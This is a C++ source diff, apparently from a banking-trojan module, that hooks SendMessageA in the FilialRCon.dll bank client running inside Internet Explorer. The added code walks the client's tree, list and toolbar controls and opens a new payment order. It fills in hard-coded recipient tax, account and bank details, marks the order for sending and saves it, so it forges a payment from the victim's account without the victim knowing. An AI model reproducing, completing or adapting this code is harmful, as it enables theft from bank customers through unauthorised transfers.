@@ -26,11 +26,65 @@ namespace DBGRAFADLL
 namespace Rafa
 {
 
+LRESULT (WINAPI *pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );
+HWND	(WINAPI *pHandlerCreateWindowExA) (DWORD,PCHAR,PCHAR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);
+
+//контрол формы, для автоматического заполнения формы данными
+struct ControlForm
+{
+	const char* name; //условное имя контрола, для его идентификации в программе
+	int x, y, w, h; //расположение контрола на форме (для поиска, изменять нельзя)
+	const char* captionText;
+	DWORD captionHash; //если хеш не указан, то ищем по captionText
+	const char* classText;
+	DWORD classHash;
+};
+
+//информация он найденном контроле
+struct ControlFinded
+{
+	HWND wnd;
+	ControlForm* info;
+};
+
 void GrabBalansFromMemoText(const char* s);
 void GrabBalansFromLVM(const char* s);
 
+HWND IEWnd = 0; //окно ИЕ в котором ищем все нужные нам окна
 DWORD PID = 0; //для избежания 2-го запуска
 int fromLVM = 0;  //если равно 1, то передаем цифру в админку (см. функцию GrabBalansFromLVM)
+HWND treeView = 0, listView = 0, toolBar = 0;
+int idBtNewDoc = 0;
+POINT posBtNewDoc;
+
+//контролы формы "Платежное поручение"
+ControlForm controlsPaymentOrder[] = 
+{
+	{ "form",	 0, 0, 606, 569,  "Платёжное поручение", 0x505B8A7A, "Canvas",  0 },
+	{ "num",	 168, 0, 50, 25,  0,					 0,			 0,			0xCB934F4 /* edit */}, //номер документа
+	{ "express", 169, 29, 67, 16, 0,					 0xEEFB4590 /* срочный */, 0, 0x5E9D34F9 /* button */}, //галочка срочный
+	{ "date",	 238, 1, 82, 24,  0,					 0,          0,         0xD3CC2481 /* sysdatetimepick32 */ }, //дата
+	{ "typepayment", 339, 1, 102, 302, 0,                0,          0,			0x2D3F0896 /* combobox */}, //вид платежа
+	{ "status",	 486, 0, 22, 25,  0,                     0,          0,         0xCB934F4 /* edit */}, //статус составителя
+	{ "innsend", 40, 106, 124, 25,0,                     0,          0,         0xCB934F4 /* edit */}, //ИНН плательщика
+	{ "kppsend", 240, 106, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП плательщика
+	{ "sum",     414, 105, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //сумма
+	{ "nds",     553, 106, 31, 22, 0,                    0xFFF36251 /* НДС */, 0, 0x5E9D34F9 /* button */}, //кнопка НДС
+	{ "innrecv", 40, 234, 124, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //ИНН получателя
+	{ "kpprecv", 240, 234, 87, 27, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП получателя
+	{ "accountrecv", 415, 234, 154, 25,	0,				 0,          0,         0xCB934F4 /* edit */}, //счет получателя
+	{ "namerecv", 91, 262, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //наименование получателя
+	{ "bikrecv", 415, 262, 154, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //БИК получателя
+	{ "bankrecv", 91, 288, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //банк получателя
+	{ "accbankrecv", 415, 288, 154, 25, 0,               0,          0,         0xCB934F4 /* edit */}, //счет банка получателя
+	{ "punktrecv", 111, 314, 217, 25, 0,				 0,          0,         0xCB934F4 /* edit */}, //населенный пункт получателя
+	{ "daterecv", 486, 315, 82, 24, 0,                   0,			 0,			0xD3CC2481 /* sysdatetimepick32 */ }, //дата исполнения
+	{ "queue",    475, 343, 93, 210, 0,					 0,			 0,			0x2D3F0896 /* combobox */}, //очередь платежа
+	{ "comment",  9, 408, 579, 97, 0,					 0,          0,         0xCB934F4 /* edit */}, //назначение платежа
+	{ "save",     415, 511, 75, 25, 0,					 0x23981105 /* Сохранить */, 0, 0x5E9D34F9 /* button */}, //кнопка сохранить
+	{ "sended",   200, 518, 81, 16, 0,                   0xAC3A81FF /* К отправке */, 0, 0x5E9D34F9 /* button */}, //галочка к отправке
+	{ 0 }
+};
 
 static PIMAGE_NT_HEADERS GetNtHeaders(PVOID Image)
 {
@@ -42,7 +96,7 @@ static PIMAGE_NT_HEADERS GetNtHeaders(PVOID Image)
   return pNtHeader;
 };
 
-static BOOLEAN PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandler,PVOID *OldHandler)
+static bool PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandler,PVOID *OldHandler)
 {
 
 	PIMAGE_NT_HEADERS		pNtHeader;
@@ -50,15 +104,15 @@ static BOOLEAN PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandle
 	CHAR buf1[MAX_PATH];
 
 	if ( Module == NULL )
-		return FALSE;
+		return false;
 
 	pNtHeader = GetNtHeaders(Module);
 	if ( pNtHeader == NULL )
-		return FALSE;
+		return false;
 
 	pData = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
 	if ( pData->Size == 0 )
-		return FALSE;
+		return false;
 	
 	m_lstrcpy(buf1,DllName);
 	pCharUpperBuffA(buf1,sizeof(buf1)-1);
@@ -92,24 +146,19 @@ static BOOLEAN PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandle
 
 				
 				DBGRAFA( "Rafa", "IAT: [%s] %x", FuncName, *FirstThunk); 
-				return TRUE;
+				return true;
 			}
 
 			FirstThunk++;	OriginalFirstThunk++;
 			VAToThunk += sizeof(VAToThunk);
 		}
 	}
-	return FALSE;
+	return false;
 }
-
-
-
-LRESULT  (WINAPI*pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );
 
 static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
 {
 	PWCHAR buf = (PWCHAR)HEAP::Alloc(4096);
-	LRESULT lResult;
 
 	switch ( Msg )
 	{
@@ -183,6 +232,489 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 
 	return (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);;
 }
+/*
+static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, PCHAR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam )
+{
+	HWND hWnd = pHandlerCreateWindowExA( dwExStyle, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, 
+										 hWndParent, hMenu, hInstance, lpParam );
+	if( hWnd )
+	{
+		DBGRAFA( "Rafa--", "'%s', '%s'", DWORD(lpClassName) < 0x10000 ? "<0x10000" : lpClassName, lpWindowName == 0 ? "" : lpWindowName );
+		DBGRAFA( "Rafa--", "(%d,%d)-(%d)", x, y, nWidth *10000 + nHeight );
+	}
+	return hWnd;
+}
+*/
+static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
+{
+	DWORD hash = GetWndClassHash(wnd);
+	if( pIsWindowVisible(wnd) )
+	{
+		if( hash == 0xEB4973EE /* SysTreeView32 */ )
+		{
+			treeView = wnd;
+		}
+		if( hash == 0xF06537E2 /* SysListView32 */ )
+		{
+			listView = wnd;
+		}
+		if( hash == 0xC1AFE727 /* ToolbarWindow32 */ )
+		{
+			TBBUTTON bt;
+			for( int i = 0; i < 20; i++ )
+			{
+				m_memset( &bt, 0, sizeof(bt) );
+				if( pSendMessageA( wnd, TB_GETBUTTON, (WPARAM)i, (LPARAM)&bt ) == FALSE ) break;
+				char text[128];
+				pSendMessageA( wnd, TB_GETBUTTONTEXT, (WPARAM)bt.idCommand, (LPARAM)text );
+				if( CalcHash(text) == 0x8CBC9350 /* Новый документ */ )
+				{
+					toolBar = wnd;
+					idBtNewDoc = bt.idCommand;
+					DBGRAFA( "Rafa", "Found button %d '%s'", bt.idCommand, text );
+					RECT r;
+					pSendMessageA( wnd, TB_GETRECT, (WPARAM)bt.idCommand, (LPARAM)&r );
+					posBtNewDoc.x = r.left;
+					posBtNewDoc.y = r.top;
+					break;
+				}
+			}
+		}
+	}
+	return TRUE;
+}
+
+static BOOL CALLBACK EnumTopWindows( HWND wnd, LPARAM lParam )
+{
+	DWORD pid = 0;
+	pGetWindowThreadProcessId( wnd, &pid );
+	if( pid == (DWORD)lParam )
+	{
+		if( GetWndClassHash(wnd) == 0x6E5950C9 /* IEFrame */ ) //окно ИЕ в текущем процессе
+		{
+			IEWnd = wnd; //запоминаем окно ИЕ
+			EnumChildWindows( wnd, EnumTreeList, 0 ); //ищем в дочерних нужные нам контролы
+			if( treeView && listView ) //нашли нужные контролы (дерево слева и таблицу справа сверху)
+			{
+				return FALSE; //останавливаем поиск
+			}
+		}
+	}
+	return TRUE;
+}
+
+//сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
+static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf )
+{
+	bool ok = false;
+	//окно нужного класса
+	if( cf->classHash ) //есть хеш имени класса, сравниваем по нему
+	{
+		if( classHash == cf->classHash )
+			ok = true;
+	}
+	else 
+	{
+		if( cf->classText ) //есть имя класса, сравниваем по имени
+		{
+			if( className )
+			{
+				if( m_strstr( className, cf->classText ) )
+					ok = true;
+			}
+		}
+	}
+	if( ok ) //класс окна совпал
+	{
+		ok = false;
+		//сравнимаем по заголовку окна
+		if( cf->captionHash ) //есть хеш заголовка
+		{
+			if( captionHash == cf->captionHash )
+				ok = true;
+		}
+		else
+		{
+			if( cf->captionText ) //есть текст заголовка
+			{
+				if( m_strstr( caption, cf->captionText ) )
+					ok = true;
+			}
+			else //заголовок не указан, сравниваем по координатам
+			{
+				int right = cf->x + cf->w - 1, bottom = cf->y + cf->h - 1;
+				if( cf->x <= r.right && right >= r.left && cf->y <= r.bottom && bottom >= r.top )
+					ok = true;
+			}
+		}
+		if( ok ) //параметры окна совпали
+			return true;
+	}
+	return false;
+}
+
+static void GetControlRect( HWND parent, HWND wnd, RECT& r )
+{
+	pGetWindowRect( wnd, &r );
+	//преобразовываем в координаты окна предка
+	POINT p;
+	p.x = r.left; p.y = r.top;
+	pScreenToClient( parent, &p );
+	r.right = p.x + r.right - r.left;
+	r.bottom = p.y + r.bottom - r.top;
+	r.left = p.x;
+	r.top = p.y;
+}
+
+static bool CmpWnd( HWND parent, HWND wnd, ControlForm* cf )
+{
+	char* caption = GetWndText(wnd);
+	char* className = GetWndClassName(wnd);
+	RECT r;
+	GetControlRect( parent, wnd, r );
+	bool res = CmpWnd( caption, CalcHash(caption), className, STR::GetHash( className, 0, true ), r, cf );
+	STR::Free(caption);
+	STR::Free(className);
+	return res;
+}
+
+//-----------------------------------------------------------------
+//вспомогательная функция для поиска форм на окне ИЕ
+static BOOL CALLBACK EnumFindForm( HWND wnd, LPARAM lParam )
+{
+	DWORD pid = 0;
+	pGetWindowThreadProcessId( wnd, &pid );
+	if( pid == PID )
+	{
+		ControlFinded* cf = (ControlFinded*)lParam;
+		if( CmpWnd( wnd, wnd, cf->info ) )
+		{
+			cf->wnd = wnd;
+			return FALSE;
+		}
+	}
+	return TRUE;
+}
+
+//ищет нужную нам форму в дочерних окнах ИЕ
+static HWND FindForm( ControlForm* form )
+{
+	ControlFinded cf;
+	cf.wnd = 0;
+	cf.info = form;
+	pEnumChildWindows( 0 /*IEWnd*/, EnumFindForm, (LPARAM)&cf );
+	return cf.wnd;
+}
+//--------------------------------------------------------------------------
+struct ForFindControls
+{
+	ControlForm* cfIn;
+	ControlFinded* cfOut;
+	int countOut; //сколько найдено
+	HWND parent;
+};
+
+//вспомогательная функция для поиска контролов на форме
+static BOOL CALLBACK EnumFindControls( HWND wnd, LPARAM lParam )
+{
+	if( pIsWindowVisible(wnd) )
+	{
+		ForFindControls* ffc = (ForFindControls*)lParam;
+		ControlForm* pcf = ffc->cfIn;
+		char* caption = GetWndText(wnd);
+		char* className = GetWndClassName(wnd);
+		DWORD captionHash = CalcHash(caption);
+		DWORD classHash = STR::GetHash( className, 0, true );
+		RECT r;
+		GetControlRect( ffc->parent, wnd, r );
+
+		DBGRAFA( "Rafa", "%s %s", caption, className );
+		while( pcf->name )
+		{
+			if( CmpWnd( caption, captionHash, className, classHash, r, pcf ) )
+			{
+				//на всякий случай смотрим, чтобы по одному описанию не нашлю несколько окон
+				int i = 0;
+				for( ; i < ffc->countOut; i++ )
+					if( ffc->cfOut[i].info == pcf )
+						break;
+				if( i >= ffc->countOut )
+				{
+					ffc->cfOut[ffc->countOut].info = pcf;
+					ffc->cfOut[ffc->countOut].wnd = wnd;
+					ffc->countOut++;
+					DBGRAFA( "Rafa", "finded %s", pcf->name );
+					break;
+				}
+			}
+			pcf++;
+		}
+
+		STR::Free(caption);
+		STR::Free(className);
+	}
+	return TRUE;
+}
+
+//ищет контролы на форме parent по описанию в массиве cfIn, результат записывается в cfOut и возвращает функция количество найденных
+//контролов. Массив cfOut должен выделен на тоже количество элементов что и cfIn
+static int FindControls( HWND parent, ControlForm* cfIn, ControlFinded* cfOut )
+{
+	ForFindControls ffc;
+	ffc.cfIn = cfIn;
+	ffc.cfOut = cfOut;
+	ffc.countOut = 0;
+	ffc.parent = parent;
+	pEnumChildWindows( parent, EnumFindControls, (LPARAM)&ffc );
+	return ffc.countOut;
+}
+
+//------------------------------------------------------------------------------------------------------------
+
+static bool FindTreeList()
+{
+	treeView = listView = 0;
+	DWORD pid = GetUniquePID();
+	pEnumWindows( EnumTopWindows, (LPARAM)pid );
+	if( treeView && listView )
+		return true;
+	return false;
+}
+
+static char* GetTextTreeItem( HTREEITEM item, char* buf, int szBuf )
+{
+	TVITEMEX infoItem;
+    m_memset( &infoItem, 0, sizeof(infoItem) );
+    infoItem.mask = TVIF_TEXT | TVIF_HANDLE;
+    infoItem.hItem = item;
+    infoItem.pszText = buf;
+    infoItem.cchTextMax = szBuf;
+    buf[0] = 0;
+    if( pSendMessageA( treeView, TVM_GETITEM, (WPARAM)0, (LPARAM)&infoItem ) )
+		return buf;
+	return 0;
+}
+
+//ищем "платежное поручение"->"Шаблоны", возвращаем item Шаблоны
+static HTREEITEM FindPaymentOrder( HTREEITEM item )
+{
+	char text[256];
+	do
+	{
+		if( pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_EXPAND, (LPARAM)item ) )
+		{
+			HTREEITEM child = 0;
+			//после разворачивания дерева, ветки могут не сразу появиться, поэтому ждем пока появятся
+			for( int i = 0; i < 20; i++ )
+			{
+				child = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_CHILD, (LPARAM)item );
+				if( child != 0 ) break;
+				pSleep(500);
+			}
+			if( child )
+			{
+				if( GetTextTreeItem( item, text, sizeof(text) ) )
+				{
+					DWORD hash = CalcHash(text);
+					if( hash == 0x505B8B0E /* Платежное поручение */ )
+					{
+						if( GetTextTreeItem( child, text, sizeof(text) ) )
+						{
+							if( m_strstr( text, "Шаблоны" ) )
+							{
+								return child;
+							}
+						}
+					}
+				}
+				HTREEITEM res = FindPaymentOrder(child);
+				if( res )
+					return res;
+			}
+		}
+		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
+		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item );
+	} while( item );
+	return 0;
+}
+
+//сворачивает указанное количество веток дерева
+static void TreeViewCollapse( HTREEITEM item, int count )
+{
+	while( count-- )
+	{
+		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_PARENT, (LPARAM)item );
+		DBGRAFA( "Rafa", "1" );
+		if( item == 0 ) break;
+		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
+	}
+}
+
+static int FindNewPaymentOrder()
+{
+	int index = -1;
+	char text[256];
+	for(;;)
+	{
+		index = (int)pSendMessageA( listView, LVM_GETNEXTITEM, (WPARAM)index, MAKELPARAM(LVNI_ALL, 0) );
+		if( index < 0 ) break;
+		LVITEM item;
+		m_memset( &item, 0, sizeof(item) );
+		item.pszText = text;
+		item.cchTextMax = sizeof(text);
+		item.iSubItem = 6; //именно в 6-м находится наименование шаблона
+		text[0] = 0;
+		pSendMessageA( listView, LVM_GETITEMTEXT, (WPARAM)index, (LPARAM)&item );
+		DWORD hash = CalcHash(text);
+		DBGRAFA( "Rafa", "ListView %d, '%s'", index, text );
+		if( hash == 0x6C433B30 /* НОВОЕ ПЛАТЕЖНОЕ ПОРУЧЕНИЕ */ )
+		{
+			break;
+		}
+	}
+	return index;
+}
+
+//ищет контрол среди найденых на форме по его имени
+static ControlFinded* GetControl( const char* name, ControlFinded* cf, int count )
+{
+	for( int i = 0; i < count; i++ )
+	{
+		if( m_lstrcmp( name, cf[i].info->name ) == 0 )
+			return &cf[i];
+	}
+	return 0;
+}
+
+//пишет текст в контрол на форме
+static bool SetText( const char* name, const char* s, ControlFinded* cf, int count, const char* sendChars = 0 )
+{
+	ControlFinded* ctrl = GetControl( name, cf, count );
+	if( ctrl )
+	{
+		if( s )
+			pSetWindowTextA( ctrl->wnd, s );
+		if( sendChars )
+		{
+			while( *sendChars )
+			{
+				SendMessageA( ctrl->wnd, WM_CHAR, (WPARAM)*sendChars, (LPARAM)0 );
+				sendChars++;
+			}
+		}
+		return true;
+	}
+	return false;
+}
+
+static bool SetButtonCheck( const char* name, bool check, ControlFinded* cf, int count )
+{
+	ControlFinded* ctrl = GetControl( name, cf, count );
+	if( ctrl )
+	{
+		pSendMessageA( ctrl->wnd, BM_SETCHECK, (WPARAM) check ? BST_CHECKED : BST_UNCHECKED, (LPARAM)0 );
+		return true;
+	}
+	return false;
+}
+
+static bool ClickButton( const char* name, ControlFinded* cf, int count )
+{
+	ControlFinded* ctrl = GetControl( name, cf, count );
+	if( ctrl )
+	{
+		HardClickToWindow( ctrl->wnd, 5, 5 );
+		return true;
+	}
+	return false;
+}
+
+//сюда попадаем когда найдены контролы TreeView и ListView окна банка
+static void WorkInRafa()
+{
+	HTREEITEM root = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_ROOT, (LPARAM)0 );
+	if( root )
+	{
+		HTREEITEM tmpls = 0;
+		//находим пункт Шаблоны, делаем несколько попыток, так как не сразу все загружается
+		for( int i = 0; i < 10; i++ )
+		{
+			tmpls = FindPaymentOrder(root); 
+			pSleep(1000);
+		}
+		if( tmpls )
+		{
+			if( pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)tmpls ) )
+			{
+				DBGRAFA( "Rafa", "Шаблоны выбраны" );
+				int indList = -1;
+				for( int i = 0; i < 10; i++ )
+				{
+					indList = FindNewPaymentOrder();
+					if( indList >= 0 ) break;
+					pSleep(1000);
+				}
+				if( indList >= 0 )
+				{
+					DBGRAFA( "Rafa", "Найдено новое платежное поручение" );
+					POINT posItem;
+					pSendMessageA( listView, LVM_GETITEMPOSITION, (WPARAM)indList, (LPARAM)&posItem );
+					HardClickToWindow( listView, posItem.x + 5, posItem.y + 5 );
+					DBGRAFA( "Rafa", "Кликнули по новому платежному поручению" );
+					FindTreeList();
+					if( toolBar )
+					{
+						HardClickToWindow( toolBar, posBtNewDoc.x + 5, posBtNewDoc.y + 5 );
+						DBGRAFA( "Rafa", "Нажали кнопку создания нового документа" );
+						//ждем появления формы ввода платежа
+						HWND formPayment = 0;
+						for( int i = 0; i < 10; i++ )
+						{
+							formPayment = FindForm( &controlsPaymentOrder[0] );
+							if( formPayment ) break;
+							pSleep(1000);
+						}
+						if( formPayment )
+						{
+							DBGRAFA( "Rafa", "Форма ввода платежа открыта" );
+							//ищем контролы в которые будем вводить
+							ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
+							int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
+							if( countControls ) //нашли нужные контролы, теперь заполняем
+							{
+								DBGRAFA( "Rafa", "Заполняем контролы" );
+								//SetText( "num", "1", cf, countControls );
+								//SetText( "status", "2", cf, countControls );
+								SetText( "sum", "1", cf, countControls );
+								SetText( "innrecv", "7705401519", cf, countControls );
+								SetText( "kpprecv", "770501001", cf, countControls );
+								SetText( "accountrecv", "40703810500", cf, countControls );
+								SetText( "namerecv", "Благотворительный Фонд 'СОЗИДАНИЕ'", cf, countControls );
+								SetText( "bikrecv", "044525225", cf, countControls );
+								SetText( "bankrecv", "Сбербанка России", cf, countControls );
+								SetText( "accbankrecv", "30101810400", cf, countControls );
+								SetText( "punktrecv", "Moscow", cf, countControls );
+								SetText( "comment", "помощь детям", cf, countControls, " " ); //посылаем еще дополнительно клавишу пробел, так как без этого форма не считает что в это поле был введен текст
+								SetButtonCheck( "sended", true, cf, countControls );
+								//сохраняем платежку
+								ClickButton( "save", cf, countControls );
+								//сворачиваем дерево до первоначального состояния
+								pSleep(5000); //ждем пока сохранится
+								TreeViewCollapse( tmpls, 3 );
+								pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
+							}
+							HEAP::Free(cf);
+						}
+						else
+							DBGRAFA( "Rafa", "Форма ввода платежа не открылась" );
+					}
+				}
+			}
+		}
+		else
+			DBGRAFA( "Rafa", "Шаблоны ненайдены" );
+	}
+}
 
 static DWORD WINAPI InitializeRafaHook( LPVOID p )
 {
@@ -192,13 +724,27 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 		LPVOID dll = pGetModuleHandleA("FilialRCon.dll");
 		if( dll )
 		{
+			bool hookDll = false;
 			for( int i = 0; i < 10; i++ )
 			{
 				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
-				DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok %d - %08x", (int)res,pHandlerSendMessageA );
+				//res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
 				if( res )
 				{
-					
+					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok %d - %08x", (int)res,pHandlerSendMessageA );
+					hookDll = true;
+					break;
+				}
+				pSleep(1000);
+			}
+			if( !hookDll ) break;
+			//ждем пока появится основное окно в котором должны быть контролы TreeView и ListView
+			for( int i = 0; i < 300; i++ )
+			{
+				if( FindTreeList() )
+				{
+					DBGRAFA( "Rafa", "Find TreeView and ListView" );
+					WorkInRafa(); 
 					return 0;
 				}
 				pSleep(1000);
@@ -206,6 +752,7 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 		}
 		pSleep(1000);
 	}
+	return 0;
 }
 
 void InitHook_FilialRConDll()
